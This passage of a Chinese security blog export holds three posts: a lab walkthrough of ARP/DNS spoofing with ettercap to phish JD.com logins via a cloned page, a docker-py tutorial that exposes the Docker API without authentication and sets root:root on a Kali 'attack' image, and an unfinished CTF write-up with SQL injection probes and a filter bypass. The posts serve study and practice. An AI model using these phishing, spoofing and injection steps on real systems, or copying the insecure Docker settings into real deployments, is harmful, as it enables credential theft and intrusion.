		<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">goBack</span>(<span class="hljs-params"></span>)</span>
<span class="hljs-function">		</span>&#123;
			window.history.back() <span class="hljs-comment">//后退+刷新</span>
		&#125;
&lt;/script&gt;
&lt;/head&gt;
&lt;body onload=<span class="hljs-string">&quot;goBack()&quot;</span>&gt; &lt;!-- 加载之后立即执行一段 JavaScript --&gt;
&lt;/body&gt;
&lt;/html&gt;</code></pre>
<p>4.实验拓扑图<br><img src="/2020/07/18/diaoyu/tuopu.png" alt></p>
<h2 id="实验步骤"><a href="#实验步骤" class="headerlink" title="实验步骤"></a>实验步骤</h2><h3 id="一-部署京东的服务器"><a href="#一-部署京东的服务器" class="headerlink" title="一.部署京东的服务器"></a>一.部署京东的服务器</h3><p>1.安装DNS和web服务器（具体步骤略）<br>2.配置DNS服务器<br>a.在正向解析中建一个区域名字为jd ip为服务器地址（10.1.1.1）<br>b.在jd域中新建一台主机  <a href="http://www.jd.com">www.jd.com</a>    ip:10.1.1.1</p>
<p>2.IIS<br>a.将默认网站停止<br>b.新建网站jd.com,文件路径为保存的jd网页<br>c.打开web服务中的asp（因为此网站不是静态网站）<br><img src="https://i.loli.net/2020/11/30/gJ3jo84Zvlp1PLh.png" alt><br>（使用2003客户机访问<a href="http://www.jd.com看看网站发布是否成功）">www.jd.com看看网站发布是否成功）</a></p>
<h3 id="二-部署kali"><a href="#二-部署kali" class="headerlink" title="二.部署kali"></a>二.部署kali</h3><p>1.将钓鱼网页的所有文件放到 kali 的/var/www/html/路径下， 并修改 1.txt 的权限， 使这个文档可以写入数据。<br><img src="https://i.loli.net/2020/11/30/JVq4XPL85nHChi6.png" alt><br>2.开启apache服务，并检查80端口是否已开启<br><code>systemctl start apache2</code><br><code>netstat -antpl</code><br><img src="https://i.loli.net/2020/11/30/h76CQJgyL3VMka8.png" alt><br>3.修改DNS欺骗配置文件，使用 vim 编辑器， 命令：vim /etc/ettercap/etter.dns，然后 添加一条 A 记录，<br>添加一条 PTR 记录，使用户访问<a href="http://www.jd.com，指向为10.1.1.2">www.jd.com，指向为10.1.1.2</a><br>  <img src="https://i.loli.net/2020/11/30/oAzX9aDBfH2qRMu.png" alt><br><code>选中一行后，按两次d可删除内容</code><br><code>想要编辑时，先按i(insert)</code><br><code>编辑结束后  :wq 保存</code><br>4.打开ettercap软件<br>5.选择sniff–unified sniffing，并选择监听eth0<br>6.然后选择Hosts——Scan for hosts–扫描完成后选择Hosts——Hosts list,可以看到扫描到的主机<br>7.添加欺骗记录<br>选中10.1.1.1，点击Add to Target 1 选中10.1.1.3，点击Add to Target 2<br>8.在Mitm选择ARP欺骗<br><img src="https://i.loli.net/2020/11/30/yPgL23A1kcTfFED.png" alt><br>在弹出的窗口中，勾选第一个点击确定<br><img src="/2020/07/18/diaoyu/6.png" alt><br>9.选择plugins – Manage the plugins，准备进行DNS欺骗<br>在弹出的窗口中， 找到 dns spoof 并双击出现*号，开始DNS欺骗</p>
<h3 id="三-用户访问登录页面"><a href="#三-用户访问登录页面" class="headerlink" title="三.用户访问登录页面"></a>三.用户访问登录页面</h3><p>1.在客户机中在中，再次登录<a href="http://www.jd.com输入用户名密码然后点击登录">www.jd.com输入用户名密码然后点击登录</a></p>
<p>2.在kali虚拟机中，已经钓鱼成功，并钓到京东的登录账户及密码(cat 1.txt)<br><img src="https://i.loli.net/2020/11/30/OFsx34ZUAGBI9CP.png" alt></p>
]]></content>
      <categories>
        <category>漏洞</category>
      </categories>
      <tags>
        <tag>DNS</tag>
      </tags>
  </entry>
  <entry>
    <title>dockerpy</title>
    <url>/2022/05/15/dockerpy/</url>
    <content><![CDATA[<h1 id="Docker-py"><a href="#Docker-py" class="headerlink" title="Docker-py"></a>Docker-py</h1><p>使用python第三方库docker-py操作docker</p>
<p>docker-py的地址：<a href="https://github.com/docker/docker-py">https://github.com/docker/docker-py</a></p>
<h2 id="配置环境"><a href="#配置环境" class="headerlink" title="配置环境"></a>配置环境</h2><h3 id="1-安装docker-py"><a href="#1-安装docker-py" class="headerlink" title="1.安装docker-py"></a>1.安装docker-py</h3><p>​    pip安装即可，安装最新版</p>
<pre><code class="hljs cmake">pip <span class="hljs-keyword">install</span> docker</code></pre>

<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220515135319833.png" alt="image-20220515135319833"></p>
<h3 id="2-配置docker"><a href="#2-配置docker" class="headerlink" title="2.配置docker"></a>2.配置docker</h3><p>本文使用的是Docker Desktop，docker版本是<code>20.10.12</code></p>
<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220515135534992.png" alt="image-20220515135534992"></p>
<h4 id="docker开启远程访问"><a href="#docker开启远程访问" class="headerlink" title="docker开启远程访问"></a>docker开启远程访问</h4><p>对于Docker Desktop来说，开启远程访问很简单，只需要再settings中选中如下配置项</p>
<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220515140305267.png" alt="image-20220515140305267"> </p>
<p>对于linux中配置远程访问就稍微麻烦一点</p>
<p><strong>方法一</strong></p>
<p>在/usr/lib/systemd/system/docker.service，配置远程访问。</p>
<p>主要是在[Service]这个部分，加上下面两个参数</p>
<pre><code class="hljs ini"><span class="hljs-comment"># vim /usr/lib/systemd/system/docker.service</span>
<span class="hljs-section">[Service]</span>
ExecStart=
<span class="hljs-attr">ExecStart</span>=/usr/bin/dockerd -H tcp://<span class="hljs-number">0.0</span>.<span class="hljs-number">0.0</span>:<span class="hljs-number">2375</span> -H unix://var/run/docker.sock</code></pre>

<p>重启</p>
<pre><code class="hljs undefined">systemctl daemon-reload
systemctl restart docker</code></pre>

<p><strong>方法二</strong></p>
<p>修改<code>daemon.json</code>的配置</p>
<pre><code class="hljs bash">vim /etc/docker/daemon.json

&#123;
  <span class="hljs-string">&quot;hosts&quot;</span>: [<span class="hljs-string">&quot;tcp://0.0.0.0:2375&quot;</span>, <span class="hljs-string">&quot;unix:///var/run/docker.sock&quot;</span>]
&#125;</code></pre>

<blockquote>
<p>“unix:///var/run/docker.sock”：unix socket，本地客户端将通过这个来连接 Docker Daemon。<br>“tcp://0.0.0.0:2375”：tcp socket，表示允许任何远程客户端通过 2375 端口连接 Docker Daemon。</p>
</blockquote>
<p>修改配置以后</p>
<p>然后让docker重新读取配置文件,并重启docker服务</p>
<pre><code class="hljs undefined">systemctl daemon-reload
systemctl restart docker</code></pre>

<p>查看docker进程：</p>
<pre><code class="hljs perl">[root@slaver2 ~]<span class="hljs-comment"># ps -ef|grep docker</span>
root      <span class="hljs-number">44221</span>      <span class="hljs-number">1</span>  <span class="hljs-number">1</span> <span class="hljs-number">18</span>:<span class="hljs-number">16</span> ?        <span class="hljs-number">00</span>:<span class="hljs-number">00</span>:<span class="hljs-number">06</span> /usr/bin/dockerd -H tcp:<span class="hljs-regexp">//</span><span class="hljs-number">0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>:<span class="hljs-number">2375</span> -H unix:<span class="hljs-regexp">//</span>var/run/docker.sock</code></pre>

<p>Docker守护进程打开一个HTTP Socket,这样才能实现远程通信</p>
<p>当开启远程访问后，可以再浏览器中查看docker服务器上的相关信息，并且该API遵循RESTful API标准</p>
<ul>
<li><p>查看当前版本：<a href="http://IP:2375/version">http://IP:2375/version</a></p>
<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220515141120592.png" alt="image-20220515141120592"></p>
</li>
<li><p>查看所有镜像信息：<a href="http://IP:2375/images/json">http://IP:2375/images/json</a></p>
<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220515140906433.png" alt="image-20220515140906433"></p>
</li>
<li><p>查看已启动容器信息：<a href="http://127.0.0.1:2375/containers/json">http://127.0.0.1:2375/containers/json</a></p>
<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220515141343749.png" alt="image-20220515141343749"></p>
</li>
<li><p>查看网卡信息： <a href="http://127.0.0.1:2375/networks/">http://127.0.0.1:2375/networks/</a></p>
<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220515141509777.png" alt="image-20220515141509777"></p>
</li>
</ul>
<h4 id="遇到的问题"><a href="#遇到的问题" class="headerlink" title="遇到的问题"></a>遇到的问题</h4><h5 id="Docker-Desktop与VM冲突"><a href="#Docker-Desktop与VM冲突" class="headerlink" title="Docker Desktop与VM冲突"></a>Docker Desktop与VM冲突</h5><p>需要注意的是，安装Docker Desktop 后VM就无法使用，原因：</p>
<blockquote>
<p>1、Device Guard或Credential Guard与Workstation不兼容。</p>
<p>2、Windows系统的Hyper-V不兼容导致</p>
</blockquote>
<p>解决方法如<a href="https://blog.csdn.net/qq_36761831/article/details/81175736">https://blog.csdn.net/qq_36761831/article/details/81175736</a></p>
<p>开启和关闭Hyper-V</p>
<pre><code class="hljs shell">bcdedit /set hypervisorlaunchtype auto
bcdedit /set hypervisorlaunchtype off</code></pre>

<p>当需要使用VM时，执行关闭Hyper-V命令即可</p>
<h5 id="配置国内镜像源"><a href="#配置国内镜像源" class="headerlink" title="配置国内镜像源"></a>配置国内镜像源</h5><p>settings=&gt;Dokcer engine修改配置内容</p>
<pre><code class="hljs json">&#123;
  <span class="hljs-attr">&quot;builder&quot;</span>: &#123;
    <span class="hljs-attr">&quot;gc&quot;</span>: &#123;
      <span class="hljs-attr">&quot;defaultKeepStorage&quot;</span>: <span class="hljs-string">&quot;20GB&quot;</span>,
      <span class="hljs-attr">&quot;enabled&quot;</span>: <span class="hljs-literal">true</span>
    &#125;
  &#125;,
  <span class="hljs-attr">&quot;experimental&quot;</span>: <span class="hljs-literal">false</span>,
  <span class="hljs-attr">&quot;features&quot;</span>: &#123;
    <span class="hljs-attr">&quot;buildkit&quot;</span>: <span class="hljs-literal">true</span>
  &#125;,
  <span class="hljs-attr">&quot;registry-mirrors&quot;</span>: [
    <span class="hljs-string">&quot;https://registry.docker-cn.com&quot;</span>,
    <span class="hljs-string">&quot;http://hub-mirror.c.163.com&quot;</span>,
    <span class="hljs-string">&quot;https://docker.mirrors.ustc.edu.cn&quot;</span>
  ]
&#125;</code></pre>

<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220515141737016.png" alt="image-20220515141737016"></p>
<h5 id="docker配置软链接"><a href="#docker配置软链接" class="headerlink" title="docker配置软链接"></a>docker配置软链接</h5><p>由于Docker Desktop默认安装在C盘，所以下载的镜像也都保存在C盘，由于镜像文件一般很大，很容易爆盘，所以需要为保存镜像的文件夹创建一个软链接，将镜像保存到其他盘。<a href="https://zhuanlan.zhihu.com/p/343278599">参考</a></p>
<p>请务必先关闭docker 或者docker desktop</p>
<ul>
<li>通过Everything或者资源管理器找到以.vhdx结尾的文件所在的位置，这些就是docker镜像路径：</li>
</ul>
<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/v2-affd20a39ee0002a4c880ff3eb4e75f7_720w.jpg" alt="img"></p>
<ul>
<li>将.vhdx复制到想要的路径下，本文路径为：</li>
</ul>
<p><img src="https://pic1.zhimg.com/80/v2-70f80706f26839ff0dd3a4fcdc0aca80_720w.jpg" alt="img"></p>
<ul>
<li><p>删除源文件夹，本文是data文件夹</p>
</li>
<li><p>以管理员运行cmd并且使用以下命令创建链接：</p>
<pre><code class="hljs shell">mklink /J C:\Users\admin\AppData\Local\Docker\wsl\data   D:\docker\data</code></pre>

<p>请大家自行替换路径，本文路径分别为源路径：C:\Users\admin\AppData\Local\Docker\wsl\data</p>
<p>以及想要移动的路径：D:\docker\data此时可以在源路径看到新建出来的文件夹</p>
</li>
</ul>
<h2 id="使用dockerpy"><a href="#使用dockerpy" class="headerlink" title="使用dockerpy"></a>使用dockerpy</h2><p>官方给出了详细的说明文档<a href="https://docker-py.readthedocs.io/en/stable/index.html">说明文档</a>，下面只给出几个常见的操作</p>
<h3 id="image相关操作"><a href="#image相关操作" class="headerlink" title="image相关操作"></a>image相关操作</h3><p>进入docker库的imges.py中可以看到与镜像相关的所有操作，包括在shell中使用的build、pull、push、search等操作</p>
<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220515144118231.png" alt="image-20220515144118231"></p>
<h4 id="list"><a href="#list" class="headerlink" title="list()"></a>list()</h4><p>查看源码，可知有三个可选参数</p>
<pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">list</span>(<span class="hljs-params">self, name=<span class="hljs-literal">None</span>, <span class="hljs-built_in">all</span>=<span class="hljs-literal">False</span>, filters=<span class="hljs-literal">None</span></span>):</span>
    <span class="hljs-string">&quot;&quot;&quot;</span>
<span class="hljs-string">    List images on the server.</span>
<span class="hljs-string"></span>
<span class="hljs-string">    Args:</span>
<span class="hljs-string">        name (str): Only show images belonging to the repository ``name``</span>
<span class="hljs-string">        all (bool): Show intermediate image layers. By default, these are</span>
<span class="hljs-string">            filtered out.</span>
<span class="hljs-string">        filters (dict): Filters to be processed on the image list.</span>
<span class="hljs-string">            Available filters:</span>
<span class="hljs-string">            - ``dangling`` (bool)</span>
<span class="hljs-string">            - ``label`` (str): format either ``key`` or ``key=value``</span>
<span class="hljs-string"></span>
<span class="hljs-string">    Returns:</span>
<span class="hljs-string">        (list of :py:class:`Image`): The images.</span>
<span class="hljs-string"></span>
<span class="hljs-string">    Raises:</span>
<span class="hljs-string">        :py:class:`docker.errors.APIError`</span>
<span class="hljs-string">            If the server returns an error.</span>
<span class="hljs-string">    &quot;&quot;&quot;</span>
    resp = self.client.api.images(name=name, <span class="hljs-built_in">all</span>=<span class="hljs-built_in">all</span>, filters=filters)
    <span class="hljs-keyword">return</span> [self.get(r[<span class="hljs-string">&quot;Id&quot;</span>]) <span class="hljs-keyword">for</span> r <span class="hljs-keyword">in</span> resp]</code></pre>

<h5 id="获取所有镜像"><a href="#获取所有镜像" class="headerlink" title="获取所有镜像"></a>获取所有镜像</h5><pre><code class="hljs python"><span class="hljs-keyword">import</span> docker

client = docker.from_env()
imagesList = client.images.<span class="hljs-built_in">list</span>()
print(imagesList)</code></pre>

<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220515143446882.png" alt="image-20220515143446882"></p>
<h4 id="get"><a href="#get" class="headerlink" title="get()"></a>get()</h4><p>该函数只有一个参数name，镜像名称</p>
<p>获取指定名称的镜像</p>
<pre><code class="hljs python"><span class="hljs-keyword">import</span> docker
client = docker.from_env()
mysqlImage = client.images.get(<span class="hljs-string">&quot;mysql&quot;</span>)
print(mysqlImage)</code></pre>

<h4 id="search"><a href="#search" class="headerlink" title="search()"></a>search()</h4><p>与docker search 命令相同</p>
<pre><code class="hljs stylus">searchList = client<span class="hljs-selector-class">.images</span><span class="hljs-selector-class">.search</span>(<span class="hljs-string">&quot;nginx&quot;</span>)
<span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(searchList)</span></span></code></pre>

<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220515153818793.png" alt="image-20220515153818793"></p>
<h4 id="pull"><a href="#pull" class="headerlink" title="pull()"></a>pull()</h4><p>作用等同于docker pull</p>
<pre><code class="hljs stylus">client<span class="hljs-selector-class">.images</span><span class="hljs-selector-class">.pull</span>(<span class="hljs-string">&quot;nginx&quot;</span>)</code></pre>

<h3 id="container相关操作"><a href="#container相关操作" class="headerlink" title="container相关操作"></a>container相关操作</h3><p>容器相关的操作很多</p>
<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220515161345640.png" alt="image-20220515161345640"></p>
<h4 id="run"><a href="#run" class="headerlink" title="run()"></a>run()</h4><p>官方注释</p>
<pre><code class="hljs lasso">Run a container. <span class="hljs-keyword">By</span> default, it will wait for the container <span class="hljs-keyword">to</span> finish
<span class="hljs-literal">and</span> <span class="hljs-keyword">return</span> its logs, similar <span class="hljs-keyword">to</span> <span class="hljs-string">``</span>docker run<span class="hljs-string">``</span>.
<span class="hljs-comment">// </span>
<span class="hljs-keyword">If</span> the <span class="hljs-string">``</span>detach<span class="hljs-string">``</span> argument is <span class="hljs-string">``</span><span class="hljs-literal">True</span><span class="hljs-string">``</span>, it will start the container
<span class="hljs-literal">and</span> immediately <span class="hljs-keyword">return</span> a :py:class:<span class="hljs-string">`Container`</span> object, similar <span class="hljs-keyword">to</span>
<span class="hljs-string">``</span>docker run <span class="hljs-params">-d</span><span class="hljs-string">``</span>.</code></pre>



<pre><code class="hljs python">port_dict = &#123;<span class="hljs-string">&#x27;2222/tcp&#x27;</span>: <span class="hljs-number">3333</span>&#125;
image_name = nginx
client.containers.run(image_name, ports=port_dict, detach=<span class="hljs-literal">True</span>)  <span class="hljs-comment"># 以守护进程的方式创建容器，容器停止后不会删除</span>

```
- The port number, <span class="hljs-keyword">as</span> an integer. For example,
``&#123;<span class="hljs-string">&#x27;2222/tcp&#x27;</span>: <span class="hljs-number">3333</span>&#125;`` will expose port <span class="hljs-number">2222</span> inside the
container <span class="hljs-keyword">as</span> port <span class="hljs-number">3333</span> on the host.
- ``<span class="hljs-literal">None</span>``, to assign a random host port. For example,
``&#123;<span class="hljs-string">&#x27;2222/tcp&#x27;</span>: <span class="hljs-literal">None</span>&#125;``.
- A <span class="hljs-built_in">tuple</span> of ``(address, port)`` <span class="hljs-keyword">if</span> you want to specify the
host interface. For example,
``&#123;<span class="hljs-string">&#x27;1111/tcp&#x27;</span>: (<span class="hljs-string">&#x27;127.0.0.1&#x27;</span>, <span class="hljs-number">1111</span>)&#125;``.
- A <span class="hljs-built_in">list</span> of integers, <span class="hljs-keyword">if</span> you want to bind multiple host ports
to a single container port. For example,
``&#123;<span class="hljs-string">&#x27;1111/tcp&#x27;</span>: [<span class="hljs-number">1234</span>, <span class="hljs-number">4567</span>]&#125;``.
```</code></pre>

<h4 id="get-1"><a href="#get-1" class="headerlink" title="get()"></a>get()</h4><p>获取容器对象</p>
<pre><code class="hljs python">docker_container_id = <span class="hljs-string">&quot;236efe761aeb&quot;</span>
container = client.containers.get(docker_container_id)
print(container.<span class="hljs-built_in">id</span>)
print(container.attrs) <span class="hljs-comment"># 获取容器的详细信息</span></code></pre>

<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220515163148958.png" alt="image-20220515163148958"></p>
<h4 id="exec"><a href="#exec" class="headerlink" title="exec()"></a>exec()</h4><p>进入容器内部执行命令，与下面的命令作用相同</p>
<pre><code class="hljs applescript">docker exec -<span class="hljs-keyword">it</span> containerID bash</code></pre>

<pre><code class="hljs python">command = <span class="hljs-string">&#x27;touch /tmp/flag&#x27;</span> 
port_dict = &#123;<span class="hljs-string">&#x27;2222/tcp&#x27;</span>: <span class="hljs-number">3333</span>&#125;
image_name = nginx
container = client.containers.run(image_name, ports=port_dict, detach=<span class="hljs-literal">True</span>)  
container.exec_run(command)</code></pre>



<h3 id="network相关操作"><a href="#network相关操作" class="headerlink" title="network相关操作"></a>network相关操作</h3><h4 id="create"><a href="#create" class="headerlink" title="create"></a>create</h4><p>使用默认参数，桥接模式创建网卡</p>
<pre><code class="hljs python">client.networks.create(<span class="hljs-string">&quot;net1&quot;</span>, driver=<span class="hljs-string">&quot;bridge&quot;</span>)</code></pre>

<p>使用自定义IPAM配置创建更高级的网络。例如，将子网设置为192.168.52.0/24和网关地址为192.168.52.254</p>
<pre><code class="hljs routeros">ipam_pool = docker.types.IPAMPool(
    <span class="hljs-attribute">subnet</span>=<span class="hljs-string">&#x27;192.168.52.0/24&#x27;</span>,
    <span class="hljs-attribute">gateway</span>=<span class="hljs-string">&#x27;192.168.52.254&#x27;</span>
)
ipam_config = docker.types.IPAMConfig(
    pool_configs=[ipam_pool]
)

client.networks.create(
    <span class="hljs-string">&quot;network1&quot;</span>,
    <span class="hljs-attribute">driver</span>=<span class="hljs-string">&quot;bridge&quot;</span>,
    <span class="hljs-attribute">ipam</span>=ipam_config
)</code></pre>



<h1 id="创建kali攻击机镜像"><a href="#创建kali攻击机镜像" class="headerlink" title="创建kali攻击机镜像"></a>创建kali攻击机镜像</h1><h2 id="下载镜像"><a href="#下载镜像" class="headerlink" title="下载镜像"></a>下载镜像</h2><pre><code class="hljs nginx"><span class="hljs-attribute">docker</span> pull kalilinux/kali-rolling</code></pre>

<p>查看下载的镜像</p>
<pre><code class="hljs ebnf"><span class="hljs-attribute">docker images</span></code></pre>

<h2 id="启动容器"><a href="#启动容器" class="headerlink" title="启动容器"></a>启动容器</h2><pre><code class="hljs apache"><span class="hljs-attribute">docker</span> run -itd -p <span class="hljs-number">3399</span>:<span class="hljs-number">3389</span> kalilinux/kali-rolling /bin/bash</code></pre>

<p>查看容器id</p>
<pre><code class="hljs ebnf"><span class="hljs-attribute">docker ps</span></code></pre>

<p>进入容器</p>
<pre><code class="hljs applescript">docker exec -<span class="hljs-keyword">it</span> <span class="hljs-built_in">id</span> bash</code></pre>

<h2 id="安装基础环境包"><a href="#安装基础环境包" class="headerlink" title="安装基础环境包"></a>安装基础环境包</h2><p>❗需要关闭防火墙或者打开3399端口，否则无法连接</p>
<p>首先安装vim</p>
<pre><code class="hljs routeros">apt-<span class="hljs-builtin-name">get</span> -y update &amp;&amp; apt-<span class="hljs-builtin-name">get</span> -y upgrade
apt-<span class="hljs-builtin-name">get</span> update --fix-missing	
apt-<span class="hljs-builtin-name">get</span> install vim</code></pre>

<p>修改镜像源</p>
<pre><code class="hljs awk">vim <span class="hljs-regexp">/etc/</span>apt/sources.list

添加内容
deb http:<span class="hljs-regexp">//mi</span>rrors.ustc.edu.cn/kali kali-rolling main non-free contrib
deb-src http:<span class="hljs-regexp">//mi</span>rrors.ustc.edu.cn/kali kali-rolling main non-free contrib</code></pre>

<p>安装基础环境包</p>
<pre><code class="hljs routeros">apt-<span class="hljs-builtin-name">get</span> -y update &amp;&amp; apt-<span class="hljs-builtin-name">get</span> -y<span class="hljs-built_in"> upgrade </span>&amp;&amp; \
   <span class="hljs-attribute">DEBIAN_FRONTEND</span>=noninteractive apt-<span class="hljs-builtin-name">get</span> install -y \
   kali-tools-top10 \
   pciutils \
   iputils-ping \
   bash-completion &amp;&amp; \
   apt-<span class="hljs-builtin-name">get</span> autoremove -y &amp;&amp; \
   apt-<span class="hljs-builtin-name">get</span> clean</code></pre>

<h2 id="生成新镜像"><a href="#生成新镜像" class="headerlink" title="生成新镜像"></a>生成新镜像</h2><p>待上面的所有程序安装完成后，打包生成新镜像</p>
<pre><code class="hljs apache"><span class="hljs-attribute">docker</span> commit f<span class="hljs-number">16618</span>e<span class="hljs-number">0</span>fda<span class="hljs-number">5</span> kali-<span class="hljs-number">2021</span></code></pre>



<h2 id="远程桌面环境安装"><a href="#远程桌面环境安装" class="headerlink" title="远程桌面环境安装"></a>远程桌面环境安装</h2><h3 id="使用新镜像启动容器"><a href="#使用新镜像启动容器" class="headerlink" title="使用新镜像启动容器"></a>使用新镜像启动容器</h3><pre><code class="hljs apache"><span class="hljs-attribute">docker</span> run -itd -p <span class="hljs-number">3399</span>:<span class="hljs-number">3389</span> kali-<span class="hljs-number">2021</span></code></pre>

<p>进入镜像</p>
<pre><code class="hljs applescript">docker exec -<span class="hljs-keyword">it</span> <span class="hljs-built_in">id</span> bash</code></pre>

<h3 id="安装桌面服务"><a href="#安装桌面服务" class="headerlink" title="安装桌面服务"></a>安装桌面服务</h3><p><strong>●</strong> kali-desktop-xfce ：安装远程桌面环境</p>
<p><strong>●</strong> xrdp ：远程桌面服务</p>
<p><strong>●</strong> xorg：xorg是x11的一个实现，xorg提供X server</p>
<pre><code class="hljs routeros">apt-<span class="hljs-builtin-name">get</span> update

apt-<span class="hljs-builtin-name">get</span> -y install kali-desktop-xfce xorg xrdp</code></pre>

<p>配置xrdp实现远程连接图形界面：</p>
<pre><code class="hljs 1c">sed -i &#x27;s/port=<span class="hljs-number">3399</span>/port=<span class="hljs-number">3389</span>/g&#x27; /etc/xrdp/xrdp.ini
service xrdp restart</code></pre>

<p>修改root用户密码：</p>
<pre><code class="hljs vim">passwd root


<span class="hljs-keyword">echo</span> roo<span class="hljs-variable">t:root</span>|chpasswd</code></pre>

<p>再次登录XRDP：</p>
<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220304155750507.png" alt="image-20220304155750507"></p>
<h3 id="打包镜像"><a href="#打包镜像" class="headerlink" title="打包镜像"></a>打包镜像</h3><pre><code class="hljs applescript">docker commit <span class="hljs-built_in">id</span> docker-attack</code></pre>

<h2 id="编写Dockerfile"><a href="#编写Dockerfile" class="headerlink" title="编写Dockerfile"></a>编写Dockerfile</h2><p>因为启动容器后需要运行</p>
<pre><code class="hljs 1c">sed -i &#x27;s/port=<span class="hljs-number">3399</span>/port=<span class="hljs-number">3389</span>/g&#x27; /etc/xrdp/xrdp.ini
service xrdp restart</code></pre>

<p>所有使用Dockerfile完成这两步操作</p>
<pre><code class="hljs dockerfile"><span class="hljs-keyword">FROM</span> kali-attack:latest
<span class="hljs-keyword">COPY</span><span class="bash"> run.sh /home/run.sh</span>
<span class="hljs-keyword">RUN</span><span class="bash"> chmod +x /home/run.sh</span>
<span class="hljs-keyword">CMD</span><span class="bash"> [<span class="hljs-string">&quot;/bin/bash&quot;</span>,<span class="hljs-string">&quot;-c&quot;</span>,<span class="hljs-string">&quot;/home/run.sh &amp;&amp; tail -f /dev/null&quot;</span>]</span></code></pre>

<p> 没有<code>tail -f /dev/null</code>会导致启动容器后自动退出无法使用，<a href="https://yeasy.gitbook.io/docker_practice/image/dockerfile/cmd">原因</a>可能如下</p>
<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220305103247695.png" alt="image-20220305103247695"></p>
<p><code>run.sh</code>中的内容，为启动容器后需要执行的两条命令</p>
<pre><code class="hljs sh"><span class="hljs-meta">#!/bin/bash</span>

sed -i <span class="hljs-string">&#x27;s/port=3399/port=3389/g&#x27;</span> /etc/xrdp/xrdp.ini
<span class="hljs-built_in">wait</span>
service xrdp restart</code></pre>

<p>使用</p>
<pre><code class="hljs apache"><span class="hljs-attribute">docker</span> build -t kali-attack<span class="hljs-number">2</span> .</code></pre>

<p>创建镜像，之后创建容器</p>
<pre><code class="hljs apache"><span class="hljs-attribute">docker</span> run -itd -p <span class="hljs-number">3399</span>:<span class="hljs-number">3389</span> kali-attack<span class="hljs-number">2</span></code></pre>

<p>这样就可以直接使用mstvc.exe连接kali桌面</p>
<pre><code class="hljs avrasm"><span class="hljs-symbol">username:</span>root
<span class="hljs-symbol">password:</span>root</code></pre>



<h1 id="docker访问宿主机网络资源"><a href="#docker访问宿主机网络资源" class="headerlink" title="docker访问宿主机网络资源"></a>docker访问宿主机网络资源</h1><p><a href="https://swiftflamel.com/2021/04/01/docker-container%E5%AE%B9%E5%99%A8%E5%86%85%E8%AE%BF%E9%97%AE%E5%AE%BF%E4%B8%BB%E6%9C%BAhost%E6%9C%8D%E5%8A%A1/">解决方案</a></p>
<p>本文使用的的windows docker版本大于18.03可以直接使用<code>host.docker.internal</code>访问宿主机网络资源</p>
<p>其他操作系统的可以<a href="https://www.jianshu.com/p/4a358a120983">参考</a></p>
<h1 id="docker容器安装vim出错"><a href="#docker容器安装vim出错" class="headerlink" title="docker容器安装vim出错"></a>docker容器安装vim出错</h1><p>报错信息如下</p>
<pre><code class="hljs apache"><span class="hljs-attribute">ncurses</span>-base : Breaks: libtinfo<span class="hljs-number">5</span> (&lt; <span class="hljs-number">6</span>.<span class="hljs-number">1</span>) but <span class="hljs-number">6</span>.<span class="hljs-number">0</span>+<span class="hljs-number">20161126</span>-<span class="hljs-number">1</span>+deb<span class="hljs-number">9</span>u<span class="hljs-number">2</span> is to be installed
<span class="hljs-attribute">E</span>: Error, pkgProblemResolver::Resolve generated breaks, this may be caused by held packages.
<span class="hljs-attribute">E</span>: Unable to correct dependencies</code></pre>

<p>直接使用apt安装此包即可</p>
<pre><code class="hljs vim">apt <span class="hljs-keyword">update</span>
apt upgrade
apt install <span class="hljs-keyword">vim</span></code></pre>

]]></content>
      <categories>
        <category>python</category>
      </categories>
      <tags>
        <tag>docker</tag>
      </tags>
  </entry>
  <entry>
    <title>fakebook</title>
    <url>/2020/09/27/fakebook/</url>
    <content><![CDATA[<h1 id="攻防世界-fakebook"><a href="#攻防世界-fakebook" class="headerlink" title="攻防世界-fakebook"></a>攻防世界-fakebook</h1><p>感觉挺有意思的一道题，所以记录一下吧</p>
<span id="more"></span>

<h2 id="0x01发现注入点"><a href="#0x01发现注入点" class="headerlink" title="0x01发现注入点"></a>0x01发现注入点</h2><p>进入网页发现是一个博客页面，先随便注册一个账号登录上去看看，发现了一个貌似可以注入的地方</p>
<p><code>http://220.249.52.133:44224/view.php?no=1</code>参数no这里应该是一个数字型的注入点，测试一下。</p>
<p><code>http://220.249.52.133:44224/view.php?no=1 and 1=1</code>显示是正常的，但是</p>
<p><code>http://220.249.52.133:44224/view.php?no=1 and 1=2</code>网页报错，确定了就是数字型注入</p>
<p>接下来继续注入的常规操作。</p>
<p><code>http://220.249.52.133:44224/view.php?no=-2 order by 4#</code>时页面显示正常，并提示了网站的根目录</p>
<p><img src="https://i.loli.net/2020/11/30/oIDBgmVNszZ3raw.png" alt></p>
<p>但是当 order by 5 # 时，网页报错，确定是四列。</p>
<p><strong>爆表名</strong></p>
<p>本以为会顺利的爆破出来，但是提示了 hacker ，这里可能存在黑名单检测</p>
<p>试了试双写绕过，发现继续提示hack，再试试用/**/替换空格，这次居然可以了，暂且当它是禁了空格。这里还出现一个提示</p>
<p><strong>Notice: unserialize(): Error at offset 0 of 1 bytes in /var/www/html/view.php on line 31</strong> 提示存在反序列化，但是不知道怎么用继续爆表。</p>
<p><img src="https://i.loli.net/2020/11/30/RT5xSpfQ4XJakrF.png" alt></p>
